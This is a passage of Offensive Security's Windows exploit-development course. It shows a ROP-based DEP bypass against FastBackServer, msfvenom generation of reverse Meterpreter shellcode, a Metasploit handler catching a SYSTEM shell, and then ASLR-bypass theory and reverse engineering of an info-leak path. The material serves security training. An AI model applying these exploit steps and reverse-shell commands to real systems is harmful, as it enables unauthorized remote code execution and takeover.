Listing 514 - Turning off DEP by executing VirtualAlloc 
Before executing the API, we find that the memory protection is PAGE_READWRITE. But after 
executing the API, we observe that it is now the desired PAGE_EXECUTE_READWRITE. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
425 
The final step required is to align our shellcode with the return address. Instead of modifying the 
offsets used in the ROP chain, we could also insert several padding bytes before the shellcode. 
To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the address 
of the first instruction we are executing on the stack. Next, we dump the contents of the stack 
and obtain the address of where our ROP chain ends in order to obtain its address and calculate 
the difference between the two. 
0:006> p 
eax=0d55e000 ebx=0602b578 ecx=0d55e2d4 edx=77071670 esi=42424242 edi=00000000 
eip=0d55e514 esp=0d55e318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0d55e514 43              inc     ebx 
 
0:006> dd esp + 100 
0d55e418  5050118e 42424242 505115a3 ffffffe8 
0d55e428  5051579a 5051571f 50533cbf 43434343 
0d55e438  43434343 43434343 43434343 43434343 
0d55e448  43434343 43434343 43434343 43434343 
0d55e458  43434343 43434343 43434343 43434343 
0d55e468  43434343 43434343 43434343 43434343 
0d55e478  43434343 43434343 43434343 43434343 
0d55e488  43434343 43434343 43434343 43434343 
 
0:006> ? 0d55e514  - 0d55e434   
Evaluate expression: 224 = 000000e0 
Listing 515 - Finding the offset to the shellcode 
The calculation indicates we need 224 bytes of padding. Now we can update the proof of concept 
to include padding and a dummy shellcode after the ROP chain. This will help us verify that 
everything is setup correctly before including the real payload. These changes are reflected in the 
listing below.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret 
 
padding = b"C" * 0xe0 
 
shellcode = b"\xcc" * (0x400 - 276 - 4 - len(rop) - len(padding)) 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(offset+va+eip+rop+padding+shellcode,0,0,0,0) 
buf += formatString 
Listing 516 - Dummy shellcode placed at correct offset 
At this point, everything is aligned and we can execute the dummy shellcode by single-stepping 
through it. 
0:078> bp KERNEL32!VirtualAllocStub 
 
0:078> g 
Breakpoint 0 hit 
eax=51515151 ebx=061db070 ecx=ffffffe8 edx=77401670 esi=42424242 edi=00000000 
eip=74ff38c0 esp=0d5ae304 ebp=41414141 iopl=0         nv up ei pl nz na pe cy 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
426 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
KERNEL32!VirtualAllocStub: 
74ff38c0 8bff            mov     edi,edi 
 
0:078> pt 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000 
eip=749e2623 esp=0d5ae304 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
KERNELBASE!VirtualAlloc+0x53: 
749e2623 c21000          ret     10h 
 
0:078> p 
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000 
eip=0d5ae514 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0d5ae514 cc              int     3 
 
0:078> p 
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000 
eip=0d5ae515 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0d5ae515 cc              int     3 
 
0:078> p 
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000 
eip=0d5ae516 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0d5ae516 cc              int     3 
 
0:078> p 
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000 
eip=0d5ae517 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0d5ae517 cc              int     3 
Listing 517 - Executing dummy shellcode 
The execution on the stack doesn’t trigger any access violation. Congratulations, we succeeded in 
using ROP to bypass DEP! 
The final step is to replace the dummy shellcode with real reverse shellcode and obtain a remote 
shell, which we will do in the next section. 
9.4.8.1 Exercises 
1. 
Write the final part of the ROP chain to enable execution of VirtualAlloc. 
2. 
Verify that the execution of VirtualAlloc changes the memory protections and allows us to 
execute arbitrary instructions on the stack. 
3. 
Update the proof of concept to contain an offset and place some dummy shellcode at the 
right location. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
427 
9.4.9 Getting a Reverse Shell 
Now that everything is prepared, let’s replace the dummy shellcode with a reverse Meterpreter 
shellcode. 
First, let’s determine how much space we have available for our shellcode. When VirtualAlloc 
completes execution and we return into our dummy shellcode, we can dump memory at EIP to 
find the exact amount of space available, as given in Listing 518: 
0:079> dd eip L40 
0d5ae514  cccccccc cccccccc cccccccc cccccccc 
0d5ae524  cccccccc cccccccc cccccccc cccccccc 
0d5ae534  cccccccc cccccccc cccccccc cccccccc 
0d5ae544  cccccccc cccccccc cccccccc cccccccc 
0d5ae554  cccccccc cccccccc cccccccc cccccccc 
0d5ae564  cccccccc cccccccc cccccccc cccccccc 
0d5ae574  cccccccc cccccccc cccccccc cccccccc 
0d5ae584  cccccccc cccccccc cccccccc cccccccc 
0d5ae594  cccccccc cccccccc cccccccc cccccccc 
0d5ae5a4  cccccccc cccccccc cccccccc cccccccc 
0d5ae5b4  cccccccc cccccccc cccccccc cccccccc 
0d5ae5c4  cccccccc cccccccc cccccccc cccccccc 
0d5ae5d4  cccccccc cccccccc cccccccc cccccccc 
0d5ae5e4  cccccccc cccccccc cccccccc cccccccc 
0d5ae5f4  cccccccc cccccccc cccccccc cccccccc 
0d5ae604  00000000 00000000 00000000 00000000 
 
0:079> ? 0d5ae604 - eip 
Evaluate expression: 240 = 000000f0 
Listing 518 - Calculating available shellcode space 
We only have 240 bytes available, which is likely not enough for a reverse shellcode. 
Luckily, we have the freedom to increase the buffer size. If we increase it from 0x400 to 0x600 
bytes, we can compensate for a larger payload size. 
We use msfvenom to generate the shellcode, remembering to supply the bad characters with the 
-b option. 
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 
LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode 
... 
x86/shikata_ga_nai chosen with final size 544 
Payload size: 544 bytes 
Final size of python file: 2649 bytes 
shellcode =  b"" 
shellcode += b"\xda\xce\xd9\x74\x24\xf4\xbf\x54\x1c\x2e\xbc\x58\x29" 
shellcode += b"\xc9\xb1\x82\x31\x78\x18\x83\xc0\x04\x03\x78\x40\xfe" 
shellcode += b"\xdb\x40\x80\x7c\x23\xb9\x50\xe1\xad\x5c\x61\x21\xc9" 
... 
shellcode += b"\x94\x85\xa0\x59\xe0\xf7\xf3\x92\x26\x26\xc5\xef\x71" 
shellcode += b"\x36\x9e\xe0\xc8\x94\xb6\x6a\x32\x8a\xc9\xbe" 
Listing 519 - Generating Meterpreter shellcode 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
428 
From the highlighted payload size in Listing 519, we find that, due to the encoding, the shellcode 
takes up 544 bytes. 
Now, we just need to insert the shellcode into the proof of concept, and we have our final exploit 
code. Before we execute the complete exploit, we will set up a Metasploit multi/handler listener to 
catch our shell.  
msf5 > use multi/handler 
 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http 
payload => windows/meterpreter/reverse_http 
 
msf5 exploit(multi/handler) > set lhost 192.168.119.120 
lhost => 192.168.119.120 
 
msf5 exploit(multi/handler) > set lport 8080 
lport => 8080 
 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTP reverse handler on http://192.168.119.120:8080 
[*] http://192.168.119.120:8080 handling request from 192.168.120.10; (UUID: ksovwlpf) 
Staging x86 payload (181337 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:8080 -> 192.168.120.10:50978) 
 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM 
Listing 520 - Obtaining a reverse shell from FastBackServer 
The exploit was successful, and we have obtained a SYSTEM integrity Meterpreter shell while 
using ROP to bypass DEP! 
Using ROP as part of an exploit is tricky at first and requires experience. To get that experience, 
it’s best to begin by performing all the steps manually instead of relying on automated tools. 
In addition, for the more complex ROP chains we will encounter later, there are no automated 
tools that work. 
9.4.9.1 Exercises 
1. 
Enlarge the buffer size and insert a generated shellcode. 
2. 
Obtain a reverse Meterpreter shell without having WinDbg attached to FastBackServer. 
9.4.9.2 Extra Mile 
Throughout this module, we used CSFTPAV6.DLL as the source for our ROP gadgets. We chose 
this because it did not contain any null bytes and had no ASLR mitigation protection. 
Using the !nmod command from the Narly WinDbg extension, locate a different module that 
fulfills the same requirements, and then use that module to build the ROP chain. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
429 
9.4.9.3 Extra Mile 
In the Reverse Engineering For Bugs module, we located a vulnerability in the parsing of the 
psAgentCommand size fields that led to control over EIP through an SEH overwrite. 
Reuse the proof of concept code for the vulnerability and expand it into a full exploit that 
bypasses DEP and yields a reverse shell. 
9.4.9.4 Extra Mile 
Note: This Extra Mile requires you to have solved the last Extra Mile exercise in the Reverse 
Engineering For Bugs module. 
Multiple vulnerabilities are present in the Faronics Deep Freeze Enterprise Server application, 
some of which are also stack buffer overflows. Select one of these vulnerabilities and create an 
exploit for it that bypasses DEP, through the use of VirtualAlloc or VirtualProtect. 
Remember to use the !nmod command from the Narly extension to locate modules not protected 
by the ASLR mitigation. Use one of these modules to locate gadgets. 
Hint: When null bytes are present in a module, sometimes it is possible to overcome them by 
thinking creatively. 
9.5 Wrapping Up 
In this module, we have gone deep into understanding how the Data Execution Prevention 
mitigation works. As our case study, we took a straightforward stack buffer overflow vulnerability, 
added DEP, after which we applied the Return Oriented Programming attack technique to bypass 
it and obtain remote code execution. 
The presence of DEP raises the bar for obtaining code execution quite a bit, and we learned that 
when creating exploits, some creativity is required. 
Because the ROP technique completely defeats DEP, an additional security mitigation called 
ASLR was introduced. The combination of DEP and ASLR is difficult to overcome and will be our 
goal in subsequent modules. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
430 
 
10 Stack Overflows and ASLR Bypass 
As discussed in previous modules, Data Execution Prevention (DEP) bypass is possible due to the 
invention and adoption of Return Oriented Programming (ROP). Due to the invention of ROP, 
operating system developers introduced Address Space Layout Randomization (ASLR) as an 
additional mitigation technique. 
In this module, we’ll explore how ASLR and DEP work together to provide effective mitigation 
against a variety of exploits. We’ll also demonstrate an ASLR bypass with a custom-tailored case 
study and develop an exploit leveraging the ASLR bypass combined with a DEP bypass through 
the Win32 WriteProcessMemory API. 
10.1 ASLR Introduction 
ASLR was first introduced by the Pax Project345 in 2001 as a patch for the Linux operating system. 
It was integrated into Windows in 2007 with the launch of Windows Vista. 
ROP evolved over time to make many basic stack buffer overflow vulnerabilities, previously 
considered un-exploitable because of DEP, exploitable. The goal of ASLR was to mitigate exploits 
that defeat DEP with ROP. 
At a high level, ASLR defeats ROP by randomizing an EXE or DLL’s loaded address each time the 
application starts. In the next sections, we’ll examine how Windows implements ASLR and in later 
sections we’ll discuss various bypass techniques. 
10.1.1 
ASLR Implementation 
To fully describe how Windows implements ASLR, we must briefly discuss basic executable file 
compilation theory. 
When compiling an executable, the compiler accepts a parameter called the preferred base 
address (for example 0x10000000), which sets the base memory address of the executable when 
it is loaded. 
We should also take note of a related compiler flag called /REBASE, which if supplied, allows the 
loading process to use a different loading address. This flag is relevant if two DLLs were compiled 
with the same preferred base address and loaded into the same process. 
If, as in our example, the first module uses 0x10000000, the operating system will provide an 
alternative base address for the second module. This is not a security mechanism, but merely a 
feature to avoid address collision. 
To enable ASLR, a second compiler flag, /DYNAMICBASE must be set. This is set by default in 
modern versions of Visual Studio, but may not be set in other IDEs or compilers. 
Now that we’ve discussed how ASLR is enabled, let’s discuss how it works. 
 
345 (Wikipedia, 2020), https://en.wikipedia.org/wiki/PaX 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
431 
Within Windows, ASLR is implemented in two phases. First, when the operating system starts, the 
native DLLs for basic SYSTEM processes load to randomized base addresses. Windows will 
automatically avoid collisions by rebasing modules as needed. The addresses selected for these 
native modules are not changed until the operating system restarts. 
Next, when an application is started, any ASLR-enabled EXE and DLLs that are used are allocated 
to random addresses. If this includes a DLL loaded at boot as part of a SYSTEM process, its 
existing address is reused within this new application. 
It is important to note that ASLR’s randomization does not affect all the bits of the memory base 
address. Instead, only 8 of the 32 bits are randomized when a base address is chosen.346 In 
technical terms, this is known as the amount of entropy347 applied to the memory address. The 
higher 8 bits and the lower 16 bits always remain static when an executable loads. 
On 64-bit versions of Windows, ASLR has a larger entropy (up to 19 bits) and is 
therefore considered to be more effective. 
Armed with a basic understanding of ASLR implementation, let’s discuss ASLR bypasses. 
10.1.2 
ASLR Bypass Theory 
There are four main techniques for bypassing ASLR; we could either exploit modules that are 
compiled without ASLR, exploit low entropy, brute force a base address, or leverage an 
information leak. In this section, we’ll discuss each of these approaches. 
The first technique mentioned above is the simplest. As previously mentioned, ASLR must be 
enabled for each module during compilation. If an EXE or DLL is compiled without ASLR support, 
its image will be loaded to its preferred base address, provided that there are no collision issues. 
This means that, in these cases, we can locate gadgets for our ROP chain in an unprotected 
module and leverage that module to bypass DEP. 
Many third-party security solutions attempt to protect processes by injecting 
monitoring routines into them. Ironically, quite a few of these products have 
historically injected DLLs that were compiled without ASLR, thus effectively 
lowering the application’s security posture. 
We can easily determine whether a module is compiled with ASLR by searching for the 
/DYNAMICBASE bit inside the DllCharacteristics field of the PE header. Let’s demonstrate this 
with the Narly WinDbg. 
As an example, let’s start Notepad.exe and attach WinDbg. Listing 521 shows the output 
received when we execute the !nmod command. 
 
346 (BlackHat, 2012), https://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf 
347 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Address_space_layout_randomization 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
432 
0:006> .load narly 
... 
 
0:006> !nmod 
00850000 0088f000 notepad              /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\system32\notepad.exe 
674a0000 674f6000 oleacc               /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\System32\oleacc.dll 
68e60000 68ed6000 efswrt               /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\System32\efswrt.dll 
69d70000 69ddc000 WINSPOOL             /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\system32\WINSPOOL.DRV 
6a600000 6a617000 MPR                  /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\System32\MPR.dll 
6ba10000 6baf3000 MrmCoreR             /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\System32\MrmCoreR.dll 
6d3d0000 6d55c000 urlmon               /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\system32\urlmon.dll 
... 
Listing 521 - Listing ASLR support for loaded modules 
The output of the Narly plugin shows that by default, the modules used in Notepad have all been 
compiled with ASLR. This is true of most native Windows applications. 
Many early ASLR bypasses leveraged non-ASLR modules. This was even effective against 
browsers due to the widespread presence of Java version 6, which contained a DLL compiled 
without ASLR (msvcr71.dll). 
Today, most major applications use ASLR-compiled modules. However, unprotected modules are 
more common in less-popular applications and in-house applications. 
A second ASLR bypass technique leverages low entropy. In these cases, since the lower 16 bits of 
a memory address are non-randomized, we may be able to perform a partial overwrite of a return 
address while exploiting a stack overflow condition. 
This technique leverages the fact that the CPU reads the address of an instruction in little-endian 
format, while data is often read and written in big-endian format. 
For example, assume 0x7F801020 is a hypothetical return address for a function vulnerable to a 
buffer overflow. Although the address would be stored on the stack as the bytes 0x20, 0x10, 0x80, 
0x7F, in that order, the CPU would read the address as 0x7F801020. 
Imagine that we are able to leverage a buffer overflow where the ESP register points to our 
payload on the stack. In addition, let’s assume we found a JMP ESP instruction within the same 
DLL the vulnerable function belongs to, at address 0x7F801122. 
If we control the overflow in such a way that we overwrite only the first two bytes of the return 
address with the values 0x11 and 0x22, the CPU will process the partially-overwritten address as 
0x7F801122. This would effectively transfer the execution to our JMP ESP when the function 
returns, eventually running our shellcode. 
Although interesting, this ASLR bypass has some limitations. First, as already mentioned, we’d 
need to redirect the execution to an instruction or gadget within the same DLL the return address 
belongs to. In addition, because we only perform a partial overwrite of the return address, we’re 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
433 
limited to that single gadget, meaning our buffer overflow would halt immediately after executing 
it. Finally, to be effective, this technique also requires that the target application is compiled with 
ASLR, but without DEP, which is rare. 
Another ASLR bypass approach is to brute force the base address of a target module. This is 
possible on 32-bit because ASLR provides only 8 bits of entropy. The main limitation is that this 
only works for target applications that don’t crash when encountering an invalid ROP gadget 
address or in cases in which the application is automatically restarted after the crash. 
If the application does not crash, we can brute force the base address of a target module in (at 
most) 256 attempts. If the application is restarted, it may take more attempts to succeed, but the 
attack is still feasible. 
As an example, let’s consider a stack buffer overflow in a web server application. Imagine that 
every time we submit a request, a new child process is created. If we send our exploit and guess 
the ROP gadget’s base address incorrectly, the child process crashes, but the main web server 
does not. This means we can submit further requests until we guess correctly. 
Although this technique theoretically works against 32-bit applications, it is considered a special 
case and is ineffective in many situations. Nevertheless, this technique can still be useful, and 
we’ll demonstrate a variant of it later in this module. 
The fourth and final technique we’ll cover, which is used in many modern exploits, leverages an 
information leak (or “info leak”). In simple terms, this technique leverages one or more 
vulnerabilities in the application to leak the address of a loaded module. 
Info leaks are often created by exploiting a separate vulnerability (like a logic bug) that discloses 
memory or information but does not permit code execution. Once we have bypassed ASLR by 
leaking a module’s address, we could leverage another vulnerability such as a stack buffer 
overflow to gain code execution while bypassing DEP through a ROP chain. 
In addition, there are certain types of vulnerabilities (such as format string vulnerabilities) that can 
be leveraged to both trigger an info leak and execute code. 
In this section, we explored four theoretical techniques for bypassing ASLR. Next, we’ll discuss 
how to implement some of them. 
10.1.3 
Windows Defender Exploit Guard and ASLR 
In this module, we are going to revisit the FastBackServer application and expand and improve on 
an exploit from a previous module. 
Note that if your Windows 10 machine has been reverted, you must re-install 
FastBackServer before continuing. 
Let’s start by attaching WinDbg to FastBackServer. We’ll use Narly to find information related to 
compiled security mitigations. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
434 
0:078> !nmod 
00190000 001c3000 snclientapi          /SafeSEH OFF                C:\Program 
Files\Tivoli\TSM\FastBack\server\snclientapi.dll 
001d0000 001fd000 libcclog             /SafeSEH OFF                C:\Program 
Files\Tivoli\TSM\FastBack\server\libcclog.dll 
00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program 
Files\Tivoli\TSM\FastBack\server\FastBackServer.exe 
011e0000 0120b000 gsk8iccs             /SafeSEH OFF                C:\Program 
Files\ibm\gsk8\lib\gsk8iccs.dll 
01340000 01382000 NLS                  /SafeSEH ON  /GS            C:\Program 
Files\Tivoli\TSM\FastBack\Common\NLS.dll 
01390000 013ca000 icclib019            /SafeSEH ON  /GS            C:\Program 
Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll 
03170000 03260000 libeay32IBM019       /SafeSEH OFF                C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll 
10000000 1003d000 SNFS                 /SafeSEH OFF                C:\Program 
Files\Tivoli\TSM\FastBack\server\SNFS.dll 
50200000 50237000 CSNCDAV6             /SafeSEH ON  /GS            C:\Program 
Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL 
50500000 50577000 CSFTPAV6             /SafeSEH ON  /GS            C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL 
51000000 51032000 CSMTPAV6             /SafeSEH ON  /GS            C:\Program 
Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL 
57a40000 57ae3000 MSVCR90              /SafeSEH ON  /GS *ASLR *DEP  
62830000 62866000 IfsUtil              /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\SYSTEM32\IfsUtil.dll 
63550000 63577000 ulib                 /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\SYSTEM32\ulib.dll 
... 
Listing 522 - Lack of ASLR in FastBackServer 
We find that neither the main executable nor any of the IBM DLLs are compiled with ASLR, as 
shown in Listing 522. 
To learn more about how to bypass DEP and ASLR, we are going to use Windows Defender Exploit 
Guard (WDEG) to enable these mitigations for the IBM target executable and DLLs. 
Introduced in the Windows 10 Creators Update, WDEG enables the enforcement of additional 
security mitigations such as DEP and ASLR, even if they were not intended by the developer. 
To use WDEG, we’ll search for and open Windows Defender Security Center, as displayed in Figure 
140. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
435 
 
Figure 140: Searching for Windows Defender Security Center 
In the new window, we can open App & browser control, scroll to the bottom, and click Exploit 
protection settings to open the main WDEG window. 
 
Figure 141: WDEG main Window 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
436 
 
To select mitigations for a single application, we’ll click the Program settings tab, click Add 
program to customize, and select Choose exact file path, as shown in Figure 142. 
 
Figure 142: Selecting application to protect 
In the file dialog window, we’ll navigate to C:\Program Files\Tivoli\TSM\FastBack\server and 
select FastBackServer.exe. In the new settings menu, we’ll scroll down and enable “Data Execution 
Prevention (DEP)” by checking Override system settings: 
 
Figure 143: Enabling DEP for FastBackServer 
Next, we’ll scroll down to “Force randomization for images (Mandatory ASLR)” and enable it by 
checking Override system settings and turning it On, as shown in Figure 144. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
437 
 
Figure 144: Enabling ASLR for FastBackServer 
Finally, we’ll accept the settings and restart the FastBackServer to enable our changes. 
Because Narly only presents information parsed from the DllCharacteristics field 
of the PE header of the modules, rerunning it would not show that DEP and ASLR 
were enabled. 
To manually verify that ASLR is enabled, we can dump the base address of the loaded modules 
using the lm command and note the addresses. Once we restart the service, reattach WinDbg, 
and dump the base address of the loaded modules again, we can note if the base addresses have 
changed. 
As an example, we’ll select the csftpav6 module. Listing 523 shows the loaded base address of 
csftpav6.dll across three application restarts performed in separate WinDbg instances. 
0:077> lm m csftpav6 
Browse full module list 
start    end        module name 
01050000 010c7000   CSFTPAV6   (deferred)   
 
0:079> lm m csftpav6 
Browse full module list 
start    end        module name 
01130000 011a7000   CSFTPAV6   (deferred)   
 
0:066> lm m csftpav6 
Browse full module list 
start    end        module name 
01060000 010d7000   CSFTPAV6   (deferred)  
Listing 523 - Base address of csftpav6 across restart 
This confirms that our ASLR enforcement was successfully implemented, meaning that our 
exploit must now effectively bypass ASLR. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
438 
When forcing ASLR with WDEG, it is not applied to the main executable, in our case 
FastBackServer.exe. However, because FastBackServer.exe loads at a preferred base address 
containing a NULL byte, we cannot use it with memory corruption vulnerabilities for which NULL 
bytes are bad characters. 
10.1.3.1 Exercises 
1. 
Verify that ASLR is not enabled for the IBM DLLs. 
2. 
Use WDEG to force ASLR protection on all modules in the FastBackServer process, as 
shown in this section. 
10.2 Finding Hidden Gems 
Info leaks are often discovered through a logical vulnerability or through memory corruption, the 
latter of which enables the reading of unintended memory, such as out-of-bounds stack memory. 
Discovering a vulnerability that can be leveraged as an info leak usually requires copious reverse 
engineering, but we can speed up our analysis through educated guesses and various searches. 
Our aim in this module is to exploit a logical vulnerability in the FastBackServer application. The 
most comprehensive approach for discovering a vulnerability would be to reverse engineer the 
code paths for each valid opcode inside the huge FXCLI_OraBR_Exec_Command function, which 
we located in a prior module. 
However, we might be able to find useful information more quickly by exploring the Win32 APIs 
imported by the application. If an imported API could lead to an info leak and that function is likely 
being used somewhere in the application, we may be able to exploit it. 
Most Win32 APIs do not pose a security risk but a few can be directly exploited to generate an 
info leak. These include the DebugHelp APIs348 (from Dbghelp.dll), which are used to resolve 
function addresses from symbol names. 
Similar APIs are CreateToolhelp32Snapshot349 and EnumProcessModules.350 
Additionally, an C runtime API like fopen351 can be be used as well. 
In this module, we will locate and leverage a “hidden gem” left behind by the developer. 
10.2.1 
FXCLI_DebugDispatch 
Let’s begin our investigation of the imported Win32 APIs by opening our previously-analyzed 
version of FastBackServer.exe in IDA Pro. 
 
348 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/debug/dbghelp-functions 
349 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot 
350 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules 
351 (Cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fopen/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
439 
We’ll navigate to the Imports tab and scroll through all the imported APIs. Eventually, we will find 
SymGetSymFromName,352 shown in Figure 145. 
 
Figure 145: Locating SymGetSymFromName in Imports tab 
This API is particularly interesting since it can be used to resolve the memory address of any 
exported Win32 API by supplying its name. 
We don’t have enough information yet to determine whether the import of this API poses a 
security risk. First, let’s determine if we can invoke the API by sending a network packet. 
Let’s double-click on the imported API to continue our analysis in IDA Pro. This leads us to its 
entry inside the .idata section, as shown in Figure 146. 
 
Figure 146: SymGetSymFromName import in .idata section 
Next, we’ll perform a cross-reference of the API using the x hotkey, which displays the two 
results shown in Figure 147. 
 
Figure 147: Cross reference on SymGetSymFromName 
Since both these addresses are the same, we know that this API is only used once. We can 
double-click on either address to jump to the basic block where the API is invoked, as displayed in 
Figure 148. 
 
352 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
440 
 
Figure 148: Basic block responsible for invoking SymGetSymFromName 
Our goal is to use static analysis to determine if we can send a network packet to reach this basic 
block. We’ll need to find an execution path from FXCLI_OraBR_Exec_Command to the 
SymGetSymFromName API based on the opcode we provide. 
To speed up our initial discovery process we’ll perform a backward analysis. We’ll first cross-
reference the involved function calls, ignoring, for now, individual instructions and branching 
statements inside the current function. 
We can begin the analysis by locating the beginning of the current function. Figure 149 shows the 
graph overview. 
 
Figure 149: Graph layout of current function 
This is a large function, which is worth keeping in mind when we return to it later. 
Clicking on the upper left-hand side of the graph overview reveals the start of the function and its 
name, which is FXCLI_DebugDispatch, as shown in Figure 150. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
441 
 
Figure 150: Start of function FXCLI_DebugDispatch 
Next, we’ll perform a cross-reference by clicking on the highlighted section and pressing x to find 
which functions call it. 
 
Figure 151: Cross reference of FXCLI_DebugDispatch 
The cross-reference results reveal a single function, FXCLI_OraBR_Exec_Command. 
If we double-click on the search result, we jump to the basic block that calls 
FXCLI_DebugDispatch, as shown in Figure 152. 
 
Figure 152: Start of function FXCLI_DebugDispatch 
We now know that FXCLI_DebugDispatch is called from FXCLI_OraBR_Exec_Command. Next we 
must determine which opcode triggers the correct code path. 
Moving up one basic block, we discover the comparison instruction shown in Figure 153. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
442 
 
Figure 153: FXCLI_DebugDispatch is reached from opcode 0x2000 
As displayed in the above figure, the code compares the value 0x2000 and a DWORD at an offset 
from EBP. As discussed in previous modules, this offset is used to specify the opcode. 
